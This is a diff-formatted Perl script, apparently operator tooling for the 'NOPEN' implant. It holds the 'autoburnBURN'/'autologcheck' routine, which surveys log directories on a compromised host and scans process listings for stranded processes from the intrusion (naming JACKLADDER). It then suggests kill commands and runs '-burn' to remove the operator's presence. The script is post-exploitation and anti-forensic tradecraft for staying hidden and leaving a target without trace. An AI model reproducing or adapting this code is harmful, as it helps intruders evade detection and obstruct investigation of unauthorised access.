+	"\n$COLOR_NOTE\nAnd these are your cup script and sleep entries from $pscmd:\n".
+	"$COLOR_NORMAL\n".
+	$sleepcuplines."\n\n".
+	"\n".$COLOR_NOTE.
+        $cupmore.
+	"and you did run -gs wearcup earlier, so $prog will not actually\n".
+	"burn. Instead, a window just popped up with the pastables to safely get\n".
+	"off the box, removing our presence.\n\n\n"
+       );
+}
+
+# Now we do a -replay -AH but only if we are the first (noclient) hop
+# in didthis.
+($output,$nopenlines,@firsthops) = 
+  doit("-lsh didthis | grep noclient | grepip");
+my $lastout = 0;
+foreach my $ip (@firsthops) {
+  $lastout++ if $ip eq $nopen_myip;
+  last if $lastout;
+}
+if ($lastout) {
+  my $kmax = 500; # Some of our longer -ls output is > 150K
+  my $maxopt = "-S $kmax";
+  my ($ans) = mygetinput
+    (".\n".
+     "From didthis output, it appears this is your first hop in, last\n".
+     "hop out, so we will be running \"-gs replay $maxopt -AH\" to built NOPEN\n".
+     "scripts for later in cmdout/html. (The $maxopt skips commands whose output\n".
+     "is more than ${kmax}K.) You should normally let this run,\n".
+     "but if you REALLY NEED to you can <S>kip it.\n\n".
+     "<S>kip replay or <C>ontinue?","C","S"
+    );
+  
+  ($output,$nopenlines,@firsthops) = 
+    doit("-gs replay $maxopt -AH -b /bin/echo")
+      unless $ans =~ /^s/i;
+}
+
+my ($otherprog,$otheroutput) = $host_donotburn{$nopen_rhostname}
+  =~ /(\S+)\s*(.*)/;
+
+if ($otherprog) {
+  # TODO: Lost this code had to add it from memory 
+  my $solmore = " (which in a Solaris zone can be > 1)"
+      if ($host_initpid > 1);
+  my $more = "Your parent pid is init's ($host_initpid$solmore),\n".
+      "so you need only exit all live NOPENs with:   -exit";
+  if ($targetppid != $host_initpid) {
+    $more = "${COLOR_NORMAL}To skip the -burn/BURN:\n\n".
+      "First, kill your parent PID/listener manually with:    kill $targetppid\n\n".
+      "Then you can simply exit all live windows with:        -exit";
+  }
+  mydie($COLOR_FAILURE.
+	"A previous instance of $otherprog means that you\n".
+	"should probably NOT -burn/BURN off of $nopen_rhostname.\n\n\n".
+	$more
+       );
+}
+my $FUN = "BURN";
+$FUN="FIRE   FIRE   BURN"
+  if (myrand(1,100) < 6);
+
+
+
+progprint("BURNING!    BURN   $FUN   BURN");
+newhostvar("gbl_nopenburned{$gbl_nopenhosts{$nopen_rhostname}}",scalar gmtime());
+doit("-burn");
+
+($output) = doit("-lsh echo BURN ABORTED");
+if ($output =~ /ABORTED/) {
+    newhostvar("gbl_nopenburned{$gbl_nopenhosts{$nopen_rhostname}}",
+	       "ABORTED at ".scalar gmtime());
+    rename($burnfile,$abortedburnfile); 
+}
+
+# END MAIN
+
+###################################
+# SUBROUTINES
+###################################
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0 unless $calledviarequire;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs logcheck @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $vertext = "$prog version $VER\n" ;
+  }
+  clearallopts();
+#  $burncheckonly = $0 =~ /autoburn/;
+  $burnmode = $0 =~ /autoburnBURN/;
+  $prog = "-gs burnBURN" if $burnmode;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless $nopen_rhostname;
+  mydie("bad option(s)") if (! Getopts( "hvl:LRpa:xs:FBrbPTSw" ) ) ;
+  $notmp = $opt_T if $burnmode;
+  $skiprootdir = $opt_S;
+  $pscmd = "=ps";
+  ($hpuxbox)    = 1 if $nopen_serverinfo =~ /hp.{0,1}ux/i;
+  ($linuxbox)   = 1 if $nopen_serverinfo =~ /linux/i;
+  if ($nopen_serverinfo =~ /freebsd/i) {
+    # We use =ps for all others, but for freebsd we want ps aluxww
+    # the "l" option puts the parent pid right next to the pid like
+    # we want here to find both.
+    ($freebsdbox) = 1;
+    $pscmd = "ps aluxww";
+  }
+  $promptlater = $opt_P;
+  $builtinsonly = $opt_b;
+  $nopopup = (!$opt_x or $burnmode);
+  $forceburn = ($opt_B and $burnmode);
+  $nofilter = $opt_F;
+  $pause = 0;
+  $pause = "-pause" unless $opt_p;
+  my $remove = "@ARGV" ;
+  $gsoptions =~ s/$remove// ;
+  foreach (@ARGV) {
+    $dodirs{$_}++ if (/^\// and !  /^\/dev/) ;
+  }
+  my $deflogdirs = "/var/log /var/log/audit /var/adm /var/gdm /var/xdm /var/dt /var/run /var/*acct* /var/*/*acct* /etc" ;
+  # pull more dirs to look in from out put of
+  # "grep -v ^# /etc/syslog.conf" output saved by autodone, if any
+  foreach $tmpdir (split(/\s+/,$deflogdirs)) {
+    $dodirs{$tmpdir}++ ;
+  }
+  if (open(IN2,"< $optmp/.syslog.$nopen_rhostname")) {
+    while (<IN2>) {
+      # comment lines starting with # already removed when file created
+      s/\#.*// ;# remove comments after content
+      split (/\s+/) ;
+      # $_[$#_] is the final entry on the line
+      if ($_[$#_] =~ /^\// and ! ($_[$#_] =~ /^\/dev/)) {
+	$dodirs{dirname($_[$#_])}++ ;
+      }
+    }
+    close(IN2);
+  }
+  @dodirs = keys (%dodirs) ;
+#  print ("DBG: @dodirs|\n");
+  # Defaults
+  # how old to look back
+  $defhoursold = 5 ;
+  # look where for logs
+  $logdirfile = "$optmp/.logdirs.$nopen_rhostname" ;
+  if (! -e "$logdirfile" or $opt_r) {
+    if (open(OUT2,"> $logdirfile")) {
+      foreach (@dodirs) {
+	print OUT2 "$_\n";
+      }
+      close(OUT2);
+    } else {
+      mydie("Unable to open > $logdirfile");
+    }
+  }
+
+  $opt_s .= ":/etc" if $burnmode;
+  $opt_s =~ s/^://;
+
+  mydie("Unable to open < $logdirfile") unless (open(IN2,"< $logdirfile")) ;
+  @logdirs = ();
+  foreach (<IN2>) {
+    chomp;
+    next unless $_;
+    push(@logdirs,$_);
+  }
+  close(IN2) ;
+  @logdirs = uniqify_array(@logdirs);
+  for (my $i=0;$i<@logdirs;$i++) {
+    $logdirs[$i] =~ s,/+$,,;
+    $logdirs[$i] =~ s,/+,/,g;
+  }
+  %skipdirs=();
+  if (defined $opt_s) {
+    foreach (split (/:/,$opt_s)) {
+      mydie("entries in -s argument must be full paths")
+	unless (/^\//);
+      mydie("entries in -s argument must not contain whitespace")
+	if (/\s/);
+      s,/+,/,g;
+      s,/+$,,g;
+      $skipdirs{$_}++;
+    }
+  }
+
+  foreach (@logdirs) {
+    next if m,^/dev,;
+    if ($skipdirs{$_}) {
+      delete $dodirs{$_};
+      next;
+    }
+    next unless $_;
+    $dodirs{$_}++ ;
+  }
+  $dorootdir=0;
+  if ($burnmode) {
+    $recursels = "-R" if $opt_R;
+    $dorootdir++ unless $skiprootdir;
+    $dodirs{"/tmp"}++ unless $notmp;
+  };
+  @dodirs = keys %dodirs;
+  #foreach my $k (keys %dodirs) {
+  #  dbg("dodirs{$k}=$dodirs{$k}=");
+  #}
+
+  #dbg("dodirs before(@dodirs)");
+  @dodirs = uniqify_array(keys (%dodirs)) ;
+  #dbg("dodirs after(@dodirs)");
+  $logdirs = "@dodirs" ;
+  $logdirs =~ s/  / /g ;
+  #dbg("logdirs=$logdirs=");
+  if ($burnmode) {
+  } else {
+    if (open(OUT2,"> $logdirfile")) {
+      foreach (@dodirs) {
+	print OUT2 "$_\n";
+      }
+      close(OUT2);
+    } else {
+      mydie("Unable to open > $logdirfile second time");
+    }
+  }
+  %notailfiles = (utmp,1,
+		  wtmp,1,
+		  utmpx,1,
+		  wtmpx,1,
+		  lastlog,1,
+		 );
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"-gs logcheck\" is used.
+
+";
+  $gsusagetext="Usage: -gs logcheck [options] [ dir [dir2] ... ]
+
+-gs logcheck lists log directories sorted by time, then shows the tail
+of each log under $defhoursold (or -a#) hours old. The directories examined
+always include $deflogdirs and will also include any other directory
+locations found in the system's /etc/syslog.conf file. If a \"dir\" is
+provided (must start with \"/\") it is also listed (this time
+and in future uses of autologcheck for this host). Currently for
+$nopen_rhostname, these log directories will be listed:
+
+      $logdirs
+
+Files with these names are not tailed:
+
+      ".join("     ",@notailfiles)."\n".
+"OPTIONS
+
+  -h       show this usage statement
+  -l #     number of lines per file shown (defaults to 30)
+  -a #     files less than integer number of hours old are done
+  -P       prompt for what file(s) to tail (since -a gets time wrong)
+  -p       do NOT pause between each log's tail output
+  -L       does NOT tail any of the files - only shows listing
+  -r       reset log directories for this host to: /var/log /var/adm
+  -s list  Skip directories in this colon delimited list on this run
+  -x       pop up a listing of the log files in another window
+
+";
+  if ($burnmode) {
+    $gsusagetext="Usage: -gs burnBURN [options]
+
+$prog runs a few commands on target (-logs, -gs arp, w, =ps and -lt) ,
+pausing between each. It also checks for stranded files on target that we
+-put during the op. If there are any, you are alerted and should get a
+second set of expert eyes to help you. The -gs arp need not be reviewed,
+it is for analysis later.
+
+It then calls -burn for you unless you abort at any of the pauses. You
+still then have to type BURN to fully burn off target. Hitting return
+instead of \"BURN\" leaves you on target still.
+
+In the final -lt command, non-dot files called \"sess_HEXNUM\", where
+HEXNUM is a 32 digit hex number, or \"s.??????\", are filtered out unless
+the -F option is used.
+
+$prog is actually a softlink to autologcheck. Some of the -gs logcheck
+options may be useful for $prog, but probably not.
+
+On FreeBSD, \"ps aluxww\" is used instead of =ps. This gets the parent pid
+next to the pid.
+
+OPTIONS
+
+ -a #      Age under which to consider files \"new\", in hours  (default is 5)
+ -R        Recurse on -ls (all directories except /.)
+ -F        Skips the filtering of common tmp files (see above)
+ -S        Skips the -ls of / (e.g., when it hangs)
+ -T        Skips the -ls of /tmp (e.g., when it is so huge that we avoid it)
+ -B        Force the -burn (overrides some objections $prog may have).$COLOR_FAILURE
+           USE -B with caution!!!$COLOR_NORMAL
+ -w        Use builtin \"-w\" instead of w
+ -b        Use ONLY NOPEN built-ins (e.g., the =ps will be skipped--
+           you should use -b if process accounting is on)
+
+";
+  }
+  usage() if ($opt_h or $opt_v) ;
+  # how old logs
+  $wcmd = "w";
+  $wcmd = "-w" if $opt_w;
+  $hoursold = $defhoursold ;
+  if (defined $opt_a) {
+    mydie("-a argument \"$opt_a\" not a positive number")
+      unless ($opt_a =~ /^\d+\.{0,1}\d*$/) ;
+    $hoursold = $opt_a if ($opt_a > 0) ;
+  }
+  # Get timezone offset if we can
+  if (-e "$opdown/hostinfo.$nopen_rhostname") {
+    if (open(IN2,"<$opdown/hostinfo.$nopen_rhostname")) {
+      while (<IN2>) {
+	next unless /^Box Offset: (.*)/ ;
+	$val = $1 ;
+	$sign = 1 ;
+	if ($val < 0) {
+	  $val = -1 * $val ;
+	  $sign = -1 ;
+	}
+#print "DBG: $sign ... $_ ... $val  ".$val%60;
+	$hoursold -= $sign * int(100*($val / 60))/100;
+	last;
+      }
+      close(IN2) ;
+    }
+  }
+
+  # how many lines per log
+  $lines = 30 ;
+  $lines = $opt_l if ($opt_l > 0 and ($opt_l == int($opt_l))) ;
+  $lines = 0 if $opt_L or $burnmode;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  $cutofftime = Time::Local::timegm(gmtime()) ;
+  # change it to use GMT but also to offset the cutofftime based on 
+  # they guys time info in hostinfo*
+  $cutofftime -= $hoursold * 60 * 60 ; # subtract N hours (in seconds)
+
+  # NOTE: This $cutofftime is wrong. It's TOO big not sure why.
+
+} #myinit
+
+
+sub alerton {
+  # Send in triples:
+  # \@somethingpids, \@somethinglines, "something"
+  dbg("In alerton(@_)");
+  local (@ARGS) = (@_);
+  my $fullps = shift @ARGS;
+  my @fullps = @$fullps;
+  # These will contain ALL the data sent
+  my (@types,@pids,@lines,%problempid) = ();
+  # Combine all types of data sent before prompting
+  while (@ARGS) {
+    my $pidarr  = shift @ARGS;
+    my $linearr = shift @ARGS;
+    my $type    = shift @ARGS;
+    next unless (@$linearr > 0);
+    dbg("More of type=$type:@pids\n(\n".join("\n",@lines)."\n)");
+    push @types , $type;
+    push @pids , @$pidarr;
+    push @lines , @$linearr;
+  }
+  # Do not prompt unless we have something to alert on
+  return unless (@types and @lines);
+  foreach my $pid (@pids = uniqify_array(@pids)) {
+    $problempid{$pid}++;
+  }
+  my @ancestorpids = ancestorpids(@pids);
+  my $pidregexp = join("|",@ancestorpids);
+  my @problemlines = grep /[a-zA-Z] ($pidregexp) /,@fullps;
+  @problemlines = grep / ($pidregexp) /,@fullps unless @problemlines;
+  my $are = "is a";
+  my $they = "this";
+  my $s = "";
+  if (@problemlines > 1) {
+    $s    = "s";
+    $are  = "are";
+    $they = "they";
+  }
+  my $types = shift @types;
+  while (@types) {
+    if (@types > 1) {
+      $types .= ", " ;
+    } else {
+      $types .= " and ";
+    }
+    $types .= shift @types;
+  }
+  my ($more,$more2) = ("$psheader\n");
+  my $allegrep = " (".join("|",@ancestorpids).") ";
+  foreach my $pid (@ancestorpids) {
+    my ($color1,$color2) = ();
+    if ($problempid{$pid}) {
+    $more2 .= $COLOR_NOTE.$color1.$psline{$pid}."$COLOR_NORMAL\n";
+  } else {
+    $more .= $psline{$pid}."\n";
+  }
+  }
+  my $esp = "";
+  if ($aixtarget or $hpuxtarget) {
+    $esp =
+      "Especially since you are on $targetplatform,\n".
+      "where we often get on with JACKLADDER, which can strand these processes.\n\n";
+  }
+  offerabort
+    ($targetdate.
+     $COLOR_NOTE."\n".
+     "RELATED $pscmd line$s$COLOR_NORMAL (including ancestor pids in black):\n\n".
+     $more.$more2."\n$COLOR_FAILURE\n".
+     "There $are$COLOR_NOTE $types$COLOR_FAILURE line$s in the $pscmd that could be ours,\n".
+     "from today's or previous ops. $esp\n\n".
+     "Above you see ALL entries from $pscmd associated with any of these processes.\n\n".
+     "CONSIDER:\n".
+     "  #   Is the time shown recent? If not, could it still be us from earlier?\n\n".
+     "  #   Get help. No one can make this call alone.\n\n".
+     "  #   Only continue here if you are SURE these are not us.\n\n".
+     "If you and the experts AGREE $they $are us, abort (the default option here),\n".
+     "kill those pids (see pastable below), and then run -burnBURN again.\n\n".
+     "Kill pastable (if it is ALL us):   #   kill @pids\n\n".
+     "and a ps/grep to be sure they are gone:\n".
+     "                     =pse \"$allegrep\"".
+     "\n\n",
+     "A"
+    );
+}
+
+sub ancestorpids {
+  # Recursive, uses global %parentpid
+  local (@pids) = (@_);
+dbg("In ancestorpids(@_)");
+  my @retpids;
+  foreach my $pid (@pids) {
+    push @retpids,$pid;
+    push @retpids,ancestorpids($parentpid{$pid}) if $parentpid{$pid} > 1;
+  }
+  return uniqify_array(@retpids);
+  return reverse sort by_num uniqify_array(@retpids);
+}
+#TODO: Fix autologcheck to call via function call or via require
+#  TODO: Fix the cutofftime is not working.....use remote "date" command? Not builtin tho.
+# TODO: Add autologcheck to -gs survey
